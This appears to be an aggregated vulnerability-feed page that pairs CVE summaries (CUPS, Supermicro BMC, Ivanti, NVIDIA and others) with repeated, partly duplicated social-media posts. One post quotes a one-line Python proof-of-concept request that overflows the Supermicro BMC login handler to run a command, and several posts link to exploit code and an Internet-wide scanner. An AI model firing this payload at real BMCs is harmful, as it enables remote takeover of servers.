##

CVE-2024-42017
(10.0 CRITICAL)

EPSS: 0.04%

updated 2024-09-30T18:31:47

2 posts

An issue was discovered in Atos Eviden iCare 2.7.1 through 2.7.11. The application exposes a web interface locally. In the worst-case scenario, if the application is remotely accessible, it allows an attacker to execute arbitrary commands with system privilege on the endpoint hosting the application, without any authentication.

screaminggoat at 2024-10-07T17:02:12.069Z ##

It's time to name and shame as Eviden, a supposed "next-gen technology leader in data-driven, trusted and sustainable digital transformation" decided to sit on a CVSSv3.1 perfect 10.0 critical vulnerability 🥳 (cc: @cR0w) in Atos Eviden iCare tracked as CVE-2024-42017 for a full year. The CVE was assigned 30 September but this has been known since at least 07 February 2024 (they drafted up a security bulletin on 13 November 2023). The end result? "Given the obsolescence of the product, it was decided not to patch the vulnerabilities..."

In the worst-case scenario, if the application is remotely accessible, it allows an attacker to execute arbitrary commands with system privilege on the endpoint hosting the application, without any authentication.

I think the worst case scenario is using Eviden products. What exactly is iCare? "This product is an administrative tool to manage the hardware of several servers of the Bullion S and BullSequana S family. Its goal is to ease firmware patching and server sensors monitoring."

#vulnerability #CVE

##
screaminggoat@infosec.exchange at 2024-10-07T17:02:12.000Z ##

It's time to name and shame as Eviden, a supposed "next-gen technology leader in data-driven, trusted and sustainable digital transformation" decided to sit on a CVSSv3.1 perfect 10.0 critical vulnerability 🥳 (cc: @cR0w) in Atos Eviden iCare tracked as CVE-2024-42017 for a full year. The CVE was assigned 30 September but this has been known since at least 07 February 2024 (they drafted up a security bulletin on 13 November 2023). The end result? "Given the obsolescence of the product, it was decided not to patch the vulnerabilities..."

In the worst-case scenario, if the application is remotely accessible, it allows an attacker to execute arbitrary commands with system privilege on the endpoint hosting the application, without any authentication.

I think the worst case scenario is using Eviden products. What exactly is iCare? "This product is an administrative tool to manage the hardware of several servers of the Bullion S and BullSequana S family. Its goal is to ease firmware patching and server sensors monitoring."

#vulnerability #CVE

##

CVE-2024-47175
(8.6 HIGH)

EPSS: 0.04%

updated 2024-09-30T12:46:20.237000

17 posts

CUPS is a standards-based, open-source printing system, and `libppd` can be used for legacy PPD file support. The `libppd` function `ppdCreatePPDFromIPP2` does not sanitize IPP attributes when creating the PPD buffer. When used in combination with other functions such as `cfGetPrinterAttributes5`, can result in user controlled input and ultimately code execution via Foomatic. This vulnerability ca

1 repos

https://github.com/lkarlslund/jugular

lkarlslund at 2024-09-30T08:09:30.158Z ##

Use my new tool 'jugular' to do ultrafast scans of your internal networks (or the entire Internet?) for open (likely vulnerable) CUPS-browsed instances.

Many will be affected by the multiple CUPS vulnerabilities we learned about last week (CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, CVE-2024-47177) and this should help you map out what you have in your infrastructure.

It's for Linux only, as it's written for performance (direct UDP packet creation and sending). There's a compiled x64 Linux binary available, otherwise you can build it yourself.

The debacle about the entire CUPS thing is a mess. Of course getting root by installing a malicious printer is bad, but it does require the target to actually print something. I think the potential for weaponizing the parsing problems is worse though.

Let me know what you think, comments and input is welcome.

https://github.com/lkarlslund/jugular

##
patchnow24x7 at 2024-09-28T07:45:51.763Z ##

ATTENTION LINUX USERS!!

Multiple Critical vulnerabilities in CUPS (Common Unix Printing System) chained for Remote Code Execution.
POC is available publicly!

Advisories:
https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8

https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5

https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6

https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47

POC:
https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/

https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8

https://github.com/RickdeJager/cupshax/tree/main

Fixes:
CVE-2024-47175 : https://github.com/OpenPrinting/libppd/commit/d681747ebf

CVE-2024-47076 : https://github.com/OpenPrinting/libcupsfilters/commit/95576ec3

CVE-2024-47176 : https://github.com/OpenPrinting/cups-browsed/commit/1debe6b140c(temporary workaround)

Vendor Advisories:

RedHat: https://www.redhat.com/en/blog/red-hat-response-openprinting-cups-vulnerabilities

PaloAlto: https://security.paloaltonetworks.com/CVE-2024-47076

Canonical: https://ubuntu.com/blog/cups-remote-code-execution-vulnerability-fix-available

##
freexian@hachyderm.io at 2024-09-27T15:28:45.000Z ##

As concluded by the Debian Security Team –and we concur– the first updates to address the vulnerabilities will be done in unstable to evaluate if any regression is likely. Once we are confident with the fixes, we will upload to the other releases.

The four related CVEs can be tracked with the following links:

https://security-tracker.debian.org/tracker/CVE-2024-47076
https://security-tracker.debian.org/tracker/CVE-2024-47175
https://security-tracker.debian.org/tracker/CVE-2024-47176
https://security-tracker.debian.org/tracker/CVE-2024-47177

##
screaminggoat at 2024-09-27T14:55:12.990Z ##

Sonicwall security advisory: Common UNIX Printing System (CUPS) Vulnerabilities

The SonicWall PSIRT has analyzed CVE-2024-47076, CVE-2024-47177, CVE-2024-47175, and CVE-2024-47176 in the Common UNIX Printing System (CUPS) to assess their relevance to our products and services.
SonicWall products and cloud services do not incorporate the impacted CUPS software packages and are not affected by these vulnerabilities.

SonicWall PSIRT is aware that a proof of concept (PoC) exploit for this vulnerabilities is publicly available, we have no information regarding any exploitation of this vulnerability in the wild.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #vulnerability #cve #proofofconcept

##
adulau at 2024-09-27T04:17:33.792Z ##

All versions of Red Hat Enterprise Linux (RHEL) are affected by CVE-2024-47076, CVE-2024-47175, CVE-2024-47176 and CVE-2024-47177, but are not vulnerable in their default configurations.
https://vulnerability.circl.lu/bundle/3eaf0fde-67ad-4326-a84a-2e4ff201a8e9

Use my new tool 'jugular' to do ultrafast scans of your internal networks (or the entire Internet?) for open (likely vulnerable) CUPS-browsed instances.

Many will be affected by the multiple CUPS vulnerabilities we learned about last week (CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, CVE-2024-47177) and this should help you map out what you have in your infrastructure.

It's for Linux only, as it's written for performance (direct UDP packet creation and sending). There's a compiled x64 Linux binary available, otherwise you can build it yourself.

The SonicWall PSIRT has analyzed CVE-2024-47076, CVE-2024-47177, CVE-2024-47175, and CVE-2024-47176 in the Common UNIX Printing System (CUPS) to assess their relevance to our products and services.
SonicWall products and cloud services do not incorporate the impacted CUPS software packages and are not affected by these vulnerabilities.

SonicWall PSIRT is aware that a proof of concept (PoC) exploit for this vulnerabilities is publicly available, we have no information regarding any exploitation of this vulnerability in the wild.

##
screaminggoat@infosec.exchange at 2024-09-27T00:12:21.000Z ##

Tenable: CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, CVE-2024-47177: Frequently Asked Questions About Common UNIX Printing System (CUPS) Vulnerabilities
This is perhaps the most informative and comprehensive guide to the CUPS vulnerabilities yet. While I question the use of the phrase zero-days, they were publicly announced prematurely due to a leak ahead of a coordinated disclosure date, and proof of concept has been released. Fortunately, it's not the 9.9 doomsday that everyone was hawk tuahing about. Skibidi I don't think anyone reads what I write anyway. Only in Ohio though.

As @CraigHRowland said:

The bad news is there is a vulnerability in the CUPS printer system on Linux. The good news is nobody has ever gotten their printer working on Linux so they are safe.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #vulnerability #cve

##
jwildeboer@social.wildeboer.net at 2024-09-26T22:10:22.000Z ##

@GossiTheDog @dangoodin The currently assigned CVE's have these CVSS scores (which are NOT the 9.9 score claimed by the person who found the vulnerability):

https://access.redhat.com/security/cve/CVE-2024-47177 Score: 6.1
https://access.redhat.com/security/cve/CVE-2024-47176 Score 7.5
https://access.redhat.com/security/cve/CVE-2024-47175 Score 7.7
https://access.redhat.com/security/cve/CVE-2024-47076 Score 8.2

Overall rating at Red Hat is "important". Immediate workaround is available. Fixes are coming.

##
blogdiva@mastodon.social at 2024-09-26T21:51:43.000Z ##

WAIT! so i have to restart cups-browsed every time i need to print something? or y'all expecting me to connect to a printer with a cable like some kind of 20th century egghead?!?

Red Hat’s response to OpenPrinting CUPS vulnerabilities: CVE-2024-47076, CVE-2024-47175, CVE-2024-47176 and CVE-2024-47177

https://www.redhat.com/en/blog/red-hat-response-openprinting-cups-vulnerabilities

##
governa@fosstodon.org at 2024-09-26T21:24:51.000Z ##

#RedHat’s response to OpenPrinting #CUPS vulnerabilities: CVE-2024-47076, CVE-2024-47175, CVE-2024-47176 and CVE-2024-47177

https://www.redhat.com/en/blog/red-hat-response-openprinting-cups-vulnerabilities

##
screaminggoat@infosec.exchange at 2024-09-26T21:06:29.000Z ##

Palo Alto Networks advisory: CVE-2024-47076 Informational: No Impact of CUPS Vulnerabilities on Palo Alto Networks Products
The Palo Alto Networks Product Security Assurance team has evaluated CVE-2024-47076, CVE-2024-47177, CVE-2024-47175, and CVE-2024-47176 in the Common UNIX Printing System (CUPS) as they relate to our products. Based on current information, Palo Alto Networks products and cloud services do not contain affected CUPS-related software packages and are not impacted by these issues.

Note: PAN on top of the social media scene or have people giving them a heads up.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #PaloAltoNetworks #vulnerability #cve

##
screaminggoat@infosec.exchange at 2024-09-26T20:01:05.000Z ##

Evil Socket: Attacking UNIX Systems via CUPS, Part I

  • CVE-2024-47176 cups-browsed <= 2.0.1 binds on UDP INADDR_ANY:631 trusting any packet from any source to trigger a Get-Printer-Attributes IPP request to an attacker controlled URL.
  • CVE-2024-47076 libcupsfilters <= 2.1b1 cfGetPrinterAttributes5 does not validate or sanitize the IPP attributes returned from an IPP server, providing attacker controlled data to the rest of the CUPS system.
  • CVE-2024-47175 libppd <= 2.1b1 ppdCreatePPDFromIPP2 does not validate or sanitize the IPP attributes when writing them to a temporary PPD file, allowing the injection of attacker controlled data in the resulting PPD.
  • CVE-2024-47177 cups-filters <= 2.0.1 foomatic-rip allows arbitrary command execution via the FoomaticRIPCommandLine PPD parameter.

cc: @chillybot @Viss @evilsocket @morb @cR0w @Enigma

##

CVE-2024-47177
(9.0 CRITICAL)

EPSS: 0.04%

updated 2024-09-30T12:46:20.237000

19 posts

CUPS is a standards-based, open-source printing system, and cups-filters provides backends, filters, and other software for CUPS 2.x to use on non-Mac OS systems. Any value passed to `FoomaticRIPCommandLine` via a PPD file will be executed as a user controlled command. When combined with other logic bugs as described in CVE_2024-47176, this can lead to remote command execution.

2 repos

https://github.com/lkarlslund/jugular

https://github.com/referefref/cupspot-2024-47177

lkarlslund at 2024-09-30T08:09:30.158Z ##

Use my new tool 'jugular' to do ultrafast scans of your internal networks (or the entire Internet?) for open (likely vulnerable) CUPS-browsed instances.

Many will be affected by the multiple CUPS vulnerabilities we learned about last week (CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, CVE-2024-47177) and this should help you map out what you have in your infrastructure.

It's for Linux only, as it's written for performance (direct UDP packet creation and sending). There's a compiled x64 Linux binary available, otherwise you can build it yourself.

The debacle about the entire CUPS thing is a mess. Of course getting root by installing a malicious printer is bad, but it does require the target to actually print something. I think the potential for weaponizing the parsing problems is worse though.

Let me know what you think, comments and input is welcome.

https://github.com/lkarlslund/jugular

##
anthonyfloyd@mastodon.social at 2024-09-27T15:58:07.000Z ##

Holy crap. Linux admins, disable your cupsd print services and/or block udp/631 ASAP , re: CVE-2024-47176 and CVE-2024-47177.

Here's the background (an interesting and somewhat terrifying read):

https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/index.html

##
freexian@hachyderm.io at 2024-09-27T15:28:45.000Z ##

As concluded by the Debian Security Team –and we concur– the first updates to address the vulnerabilities will be done in unstable to evaluate if any regression is likely. Once we are confident with the fixes, we will upload to the other releases.

The four related CVEs can be tracked with the following links:

https://security-tracker.debian.org/tracker/CVE-2024-47076
https://security-tracker.debian.org/tracker/CVE-2024-47175
https://security-tracker.debian.org/tracker/CVE-2024-47176
https://security-tracker.debian.org/tracker/CVE-2024-47177

##
screaminggoat at 2024-09-27T14:55:12.990Z ##

Sonicwall security advisory: Common UNIX Printing System (CUPS) Vulnerabilities

The SonicWall PSIRT has analyzed CVE-2024-47076, CVE-2024-47177, CVE-2024-47175, and CVE-2024-47176 in the Common UNIX Printing System (CUPS) to assess their relevance to our products and services.
SonicWall products and cloud services do not incorporate the impacted CUPS software packages and are not affected by these vulnerabilities.

SonicWall PSIRT is aware that a proof of concept (PoC) exploit for this vulnerabilities is publicly available, we have no information regarding any exploitation of this vulnerability in the wild.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #vulnerability #cve #proofofconcept

##
adulau at 2024-09-27T04:17:33.792Z ##

All versions of Red Hat Enterprise Linux (RHEL) are affected by CVE-2024-47076, CVE-2024-47175, CVE-2024-47176 and CVE-2024-47177, but are not vulnerable in their default configurations.
https://vulnerability.circl.lu/bundle/3eaf0fde-67ad-4326-a84a-2e4ff201a8e9

Many will be affected by the multiple CUPS vulnerabilities we learned about last week (CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, CVE-2024-47177) and this should help you map out what you have in your infrastructure.

It's for Linux only, as it's written for performance (direct UDP packet creation and sending). There's a compiled x64 Linux binary available, otherwise you can build it yourself.

The debacle about the entire CUPS thing is a mess. Of course getting root by installing a malicious printer is bad, but it does require the target to actually print something. I think the potential for weaponizing the parsing problems is worse though.

Sonicwall security advisory: Common UNIX Printing System (CUPS) Vulnerabilities

The SonicWall PSIRT has analyzed CVE-2024-47076, CVE-2024-47177, CVE-2024-47175, and CVE-2024-47176 in the Common UNIX Printing System (CUPS) to assess their relevance to our products and services.
SonicWall products and cloud services do not incorporate the impacted CUPS software packages and are not affected by these vulnerabilities.

SonicWall PSIRT is aware that a proof of concept (PoC) exploit for this vulnerabilities is publicly available, we have no information regarding any exploitation of this vulnerability in the wild.

screaminggoat@infosec.exchange at 2024-09-27T00:12:21.000Z ##

Tenable: CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, CVE-2024-47177: Frequently Asked Questions About Common UNIX Printing System (CUPS) Vulnerabilities
This is perhaps the most informative and comprehensive guide to the CUPS vulnerabilities yet. While I question the use of the phrase zero-days, they were publicly announced prematurely due to a leak ahead of a coordinated disclosure date, and proof of concept has been released. Fortunately, it's not the 9.9 doomsday that everyone was hawk tuahing about. Skibidi I don't think anyone reads what I write anyway. Only in Ohio though.

As @CraigHRowland said:

The bad news is there is a vulnerability in the CUPS printer system on Linux. The good news is nobody has ever gotten their printer working on Linux so they are safe.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #vulnerability #cve

##
jwildeboer@social.wildeboer.net at 2024-09-26T22:40:16.000Z ##

@jschauma We set UI:N as once the malicious printer shows up, it could also be fed a print job by an automated queue, AFAICS. But I will ask internally about that. UPDATE for CVE-2024-47177 we did set UI:R but that one got a total of 6.2 Full string is CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:H/A:L see https://access.redhat.com/security/cve/CVE-2024-47177

##
jwildeboer@social.wildeboer.net at 2024-09-26T22:10:22.000Z ##

https://access.redhat.com/security/cve/CVE-2024-47176 Score 7.5
https://access.redhat.com/security/cve/CVE-2024-47175 Score 7.7
https://access.redhat.com/security/cve/CVE-2024-47076 Score 8.2

Overall rating at Red Hat is "important". Immediate workaround is available. Fixes are coming.

##
screaminggoat@infosec.exchange at 2024-09-26T20:01:05.000Z ##

Evil Socket: Attacking UNIX Systems via CUPS, Part I

  • CVE-2024-47176 cups-browsed <= 2.0.1 binds on UDP INADDR_ANY:631 trusting any packet from any source to trigger a Get-Printer-Attributes IPP request to an attacker controlled URL.
  • CVE-2024-47076 libcupsfilters <= 2.1b1 cfGetPrinterAttributes5 does not validate or sanitize the IPP attributes returned from an IPP server, providing attacker controlled data to the rest of the CUPS system.
  • CVE-2024-47175 libppd <= 2.1b1 ppdCreatePPDFromIPP2 does not validate or sanitize the IPP attributes when writing them to a temporary PPD file, allowing the injection of attacker controlled data in the resulting PPD.
  • CVE-2024-47177 cups-filters <= 2.0.1 foomatic-rip allows arbitrary command execution via the FoomaticRIPCommandLine PPD parameter.

cc: @chillybot @Viss @evilsocket @morb @cR0w @Enigma

##

CVE-2024-6769
(6.7 MEDIUM)

EPSS: 0.04%

updated 2024-09-30T12:46:20.237000

2 posts

A DLL Hijacking caused by drive remapping combined with a poisoning of the activation cache in Microsoft Windows 10, Windows 11, Windows Server 2016, Windows Server 2019, and Windows Server 2022 allows a malicious authenticated attacker to elevate from a medium integrity process to a high integrity process without the intervention of a UAC prompt.

1 repos

https://github.com/fortra/CVE-2024-6769

CVE-2024-45489
(9.8 CRITICAL)

EPSS: 0.04%

updated 2024-09-26T13:32:55.343000

3 posts

Arc before 2024-08-26 allows remote code execution in JavaScript boosts. Boosts that run JavaScript cannot be shared by default; however (because of misconfigured Firebase ACLs), it is possible to create or update a boost using another user's ID. This installs the boost in the victim's browser and runs arbitrary Javascript on that browser in a privileged context. NOTE: this is a no-action cloud vu

CVE-2024-20455
(8.6 HIGH)

EPSS: 0.04%

updated 2024-09-26T13:32:02.803000

1 posts

A vulnerability in the process that classifies traffic that is going to the Unified Threat Defense (UTD) component of Cisco IOS XE Software in controller mode could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device. This vulnerability exists because UTD improperly handles certain packets as those packets egress an SD-WAN IPsec tunnel. A

@browserversiontracker
I'm not seeing an updated edge release notes https://learn.microsoft.com/en-us/deployedge/microsoft-edge-relnotes-security

but they did create security advisories to reflect that they did release a new version to patch against 4 vulnerabilities from Tuesday first announced by Google: https://chromereleases.googleblog.com/2024/09/stable-channel-update-for-desktop_24.html

  • CVE-2024-9120 Use after free in Dawn
  • CVE-2024-9121 Inappropriate implementation in V8
  • CVE-2024-9122 Type Confusion in V8
  • CVE-2024-9123 Integer overflow in Skia
##

CVE-2024-42507
(9.8 CRITICAL)

EPSS: 0.04%

updated 2024-09-26T13:32:02.803000

1 posts

Command injection vulnerabilities in the underlying CLI service could lead to unauthenticated remote code execution by sending specially crafted packets destined to the PAPI (Aruba's Access Point management protocol) UDP port (8211). Successful exploitation of these vulnerabilities results in the ability to execute arbitrary code as a privileged user on the underlying operating system.

1 repos

#search_error

jbhall56@infosec.exchange at 2024-09-26T12:30:38.000Z ##

The vulnerabilities (CVE-2024-42505, CVE-2024-42506, and CVE-2024-42507) can be exploited by sending specially crafted packets to the PAPI (Aruba’s Access Point management protocol) UDP port (8211) to get privileged access to execute arbitrary code on vulnerable devices. https://www.bleepingcomputer.com/news/security/hpe-aruba-networking-fixes-three-critical-rce-flaws-impacting-its-access-points/

NVIDIA Container Toolkit 1.16.1 or earlier contains a Time-of-check Time-of-Use (TOCTOU) vulnerability when used with default configuration where a specifically crafted container image may gain access to the host file system. This does not impact use cases where CDI is used. A successful exploit of this vulnerability may lead to code execution, denial of service, escalation of privileges, informat

jbhall56 at 2024-09-30T12:30:32.338Z ##

The security issue is tracked as CVE-2024-0132 and allows an adversary to perform container escape attacks and gain full access to the host system, where they could execute commands or exfiltrate sensitive information. https://www.bleepingcomputer.com/news/security/critical-flaw-in-nvidia-container-toolkit-allows-full-host-takeover/

##
fredbrooker@witter.cz at 2024-09-29T05:15:23.000Z ##

"A critical bug in Nvidia's widely used Container Toolkit could allow a rogue user or software to escape their containers and ultimately take complete control of the underlying host.

The flaw, tracked as CVE-2024-0132, earned a 9.0 out of 10 CVSS severity rating, and affects all versions of Container Toolkit up to and including v1.16.1, and Nvidia GPU Operator up to and including 24.6.1."
https://www.theregister.com/2024/09/26/critical_nvidia_bug_container_escape/#:~:text=A%20critical%20bug,and%20including%2024.6.1.

##
dymaxion@infosec.exchange at 2024-09-28T02:14:13.000Z ##

Wow am I glad CVE-2024-0132 isn't my problem. #hugops to the folks whose problem it is

##

CVE-2024-43491
(9.8 CRITICAL)

EPSS: 0.14%

updated 2024-09-26T01:00:01.267000

6 posts

Microsoft is aware of a vulnerability in Servicing Stack that has rolled back the fixes for some vulnerabilities affecting Optional Components on Windows 10, version 1507 (initial version released July 2015). This means that an attacker could exploit these previously mitigated vulnerabilities on Windows 10, version 1507 (Windows 10 Enterprise 2015 LTSB and Windows 10 IoT Enterprise 2015 LTSB) syst

screaminggoat at 2024-10-02T14:28:30.747Z ##

@habr CVE-2024-43491 is technically not an exploited zero-day. The vulnerability was triggered which led to exploitation of other known vulnerabilities instead. CISA removed CVE-2024-43491 from the KEV Catalog based on that clarification.

##
screaminggoat@infosec.exchange at 2024-10-02T14:28:30.000Z ##

@habr CVE-2024-43491 is technically not an exploited zero-day. The vulnerability was triggered which led to exploitation of other known vulnerabilities instead. CISA removed CVE-2024-43491 from the KEV Catalog based on that clarification.

##
screaminggoat@infosec.exchange at 2024-09-26T17:26:42.000Z ##

@cR0w @campuscodi

Starting with the Windows security update released March 12, 2024 - KB5035858 (OS Build 10240.20526), the build version numbers crossed into a range that triggered a code defect in the Windows 10 (version 1507) servicing stack that handles the applicability of Optional Components. As a result, any Optional Component that was serviced with updates released since March 12, 2024 (KB5035858) was detected as "not applicable" by the servicing stack and was reverted to its RTM version.

This CVE documents the rollback of fixes that addressed vulnerabilities which affected some Optional Components for Windows 10 (version 1507). Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected.
In addition, the Windows product team at Microsoft discovered this issue, and we have seen no evidence that it is publicly known.

The CVE-2024-43491 vulnerability caused systems to be vulnerable to older known bugs that did get exploited, hence the "exploited" flag. I don't have the exact details, but Microsoft provided CISA with a list of known exploited vulnerabilities right before Patch Tuesday, and when CISA found out that this wasn't really exploited, they reached out to Microsoft for clarification.

##
screaminggoat@infosec.exchange at 2024-09-26T17:13:40.000Z ##

CISA quietly removed CVE-2024-43491 (9.8 critical, disclosed 10 September 2024 by Microsoft) Microsoft Windows Update Remote Code Execution Vulnerability from the Known Exploited Vulnerabilities (KEV) Catalog. This is because Microsoft includes the verbiage in their Frequently Asked Questions (FAQ) section: "Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected."

So on the one hand, they marked it as exploited, but they clarified that the vulnerability itself wasn't exploited. Excelsior!

cc: @campuscodi

#CISA #knownexploitedvulnerabilitiescatalog #KEV #CVE_2024_43491 #microsoft #vulnerability #zeroday #eitw #activeexploitation

##
cedric@fosstodon.org at 2024-09-26T06:02:10.000Z ##

@adulau actually it started very low:

$ curl -s 'https://api.first.org/data/v1/epss?cve=cve-2024-43491&scope=time-series' | jq '.data[0]."time-series"[-1]'
{
"epss": "0.00712000",
"percentile": "0.80862000",
"date": "2024-09-11"
}

CVE-2024-9122
(8.8 HIGH)

EPSS: 0.04%

updated 2024-09-25T18:32:27

1 posts

screaminggoat@infosec.exchange at 2024-09-27T00:04:26.000Z ##

@browserversiontracker
I'm not seeing an updated edge release notes https://learn.microsoft.com/en-us/deployedge/microsoft-edge-relnotes-security

but they did create security advisories to reflect that they did release a new version to patch against 4 vulnerabilities from Tuesday first announced by Google: https://chromereleases.googleblog.com/2024/09/stable-channel-update-for-desktop_24.html

  • CVE-2024-9120 Use after free in Dawn
  • CVE-2024-9121 Inappropriate implementation in V8
  • CVE-2024-9122 Type Confusion in V8
  • CVE-2024-9123 Integer overflow in Skia

CVE-2024-42506
(9.8 CRITICAL)

EPSS: 0.04%

updated 2024-09-25T03:30:43

1 posts

Command injection vulnerabilities in the underlying CLI service could lead to unauthenticated remote code execution by sending specially crafted packets destined to the PAPI (Aruba's Access Point management protocol) UDP port (8211). Successful exploitation of these vulnerabilities results in the ability to execute arbitrary code as a privileged user on the underlying operating system.

1 repos

#search_error

jbhall56@infosec.exchange at 2024-09-26T12:30:38.000Z ##

The vulnerabilities (CVE-2024-42505, CVE-2024-42506, and CVE-2024-42507) can be exploited by sending specially crafted packets to the PAPI (Aruba’s Access Point management protocol) UDP port (8211) to get privileged access to execute arbitrary code on vulnerable devices. https://www.bleepingcomputer.com/news/security/hpe-aruba-networking-fixes-three-critical-rce-flaws-impacting-its-access-points/

CVE-2024-8963
(9.4 CRITICAL)

EPSS: 30.99%

updated 2024-09-19T18:30:58

2 posts

Path Traversal in the Ivanti CSA before 4.6 Patch 519 allows a remote unauthenticated attacker to access restricted functionality.

screaminggoat at 2024-10-08T14:43:14.177Z ##

Happy EXPLOITED ZERO-DAY #PatchTuesday from Ivanti: October Security Update

We are aware of a limited number of customers running CSA 4.6 patch 518 and prior who have been exploited when CVE-2024-9379, CVE-2024-9380 or CVE-2024-9381 are chained with CVE-2024-8963.

  • CVE-2024-9379 (6.5 medium) SQL injection
  • CVE-2024-9380 (7.2 high) OS command injection
  • CVE-2024-9381 (7.2 high) path traversal cc: @cR0w @reverseics

#ivanti #vulnerability #eitw #activeexploitation #zeroday

  • CVE-2024-9379 (6.5 medium) SQL injection
  • CVE-2024-9380 (7.2 high) OS command injection

updated 2024-08-14T19:33:40.713000

2 posts

there is a possible way to bypass due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.

alextecplayz@techhub.social at 2024-10-04T21:57:56.000Z ##

@silmathoron Seemingly, yes. GrapheneOS claims that CVE-2024-32896 is the same as CVE-2024-29748 (https://www.bleepingcomputer.com/news/security/google-fixes-two-pixel-zero-day-flaws-exploited-by-forensics-firms/) - "CVE-2024-29745 refers to a vulnerability in the fastboot firmware used to support unlocking/flashing/locking," explained GOS on Twitter.

##
alextecplayz@techhub.social at 2024-10-04T21:57:56.000Z ##

@silmathoron Seemingly, yes. GrapheneOS claims that CVE-2024-32896 is the same as CVE-2024-29748 (https://www.bleepingcomputer.com/news/security/google-fixes-two-pixel-zero-day-flaws-exploited-by-forensics-firms/) - "CVE-2024-29745 refers to a vulnerability in the fastboot firmware used to support unlocking/flashing/locking," explained GOS on Twitter.

CVE-2024-6197
(7.5 HIGH)

EPSS: 0.07%

updated 2024-08-01T15:33:14

2 posts

libcurl's ASN1 parser has this utf8asn1str() function used for parsing an ASN.1 UTF-8 string. Itcan detect an invalid field and return error. Unfortunately, when doing so it also invokes `free()` on a 4 byte localstack buffer. Most modern malloc implementations detect this error and immediately abort. Some however accept the input pointer and add that memory to its list of available chunks. This

screaminggoat at 2024-10-08T17:41:57.817Z ##

  • CVE-2024-20659 (7.1 high) Windows Hyper-V Security Feature Bypass Vulnerability (PUBLICLY DISCLOSED)

CVE-2024-36435
(9.8 CRITICAL)

EPSS: 0.04%

updated 2024-08-01T15:31:55

5 posts

An issue was discovered on Supermicro BMC firmware in select X11, X12, H12, B12, X13, H13, and B13 motherboards (and CMM6 modules). An unauthenticated user can post crafted data to the interface that triggers a stack buffer overflow, and may lead to arbitrary remote code execution on a BMC.

ErikBussink@vmst.io at 2024-10-06T16:07:09.000Z ##

Seems #Supermicro has not yet released some updated BMC firmware to fix #CVE-2024-36435
since July 2024.
https://nvd.nist.gov/vuln/detail/CVE-2024-36435

##
LukaszOlejnik@mastodon.social at 2024-09-28T05:01:53.000Z ##

Proof of concept of a vulnerability in the BMC controller, allowing remote code execution in the server room. requests.post(‘https://192.168.10.53:443/cgi/login.cgi’, data=f ‘name={base64.b64encode(b’\x00‘ * 456 + (0x7628F874).to_bytes(4, “little”) + b’\x00‘ * 12 + (0x762864D4).to_bytes(4, “little”) + b’\x00' * 4 + (0x762936D4). to_bytes(4, ‘little’) + b'touch /tmp/BRLY‘).decode()}&pwd=&check=1’, verify=False) https://www.binarly.io/blog/cve-2024-36435-deep-dive-the-years-most-critical-bmc-security-flaw

##

https://www.binarly.io/blog/cve-2024-36435-deep-dive-the-years-most-critical-bmc-security-flaw

CVE-2024-3833
(8.8 HIGH)

EPSS: 0.04%

updated 2024-08-01T13:56:42.740000

2 posts

Object corruption in WebAssembly in Google Chrome prior to 124.0.6367.60 allowed a remote attacker to potentially exploit object corruption via a crafted HTML page. (Chromium security severity: High)

hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

##
hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

CVE-2024-34102
(9.8 CRITICAL)

EPSS: 97.28%

updated 2024-07-17T19:15:32

4 posts

Adobe Commerce versions 2.4.7, 2.4.6-p5, 2.4.5-p7, 2.4.4-p8 and earlier are affected by an Improper Restriction of XML External Entity Reference ('XXE') vulnerability that could result in arbitrary code execution. An attacker could exploit this vulnerability by sending a crafted XML document that references external entities. Exploitation of this issue does not require user interaction.

breachhq at 2024-10-07T13:37:18.899Z ##

🚨#DataBreach🚨
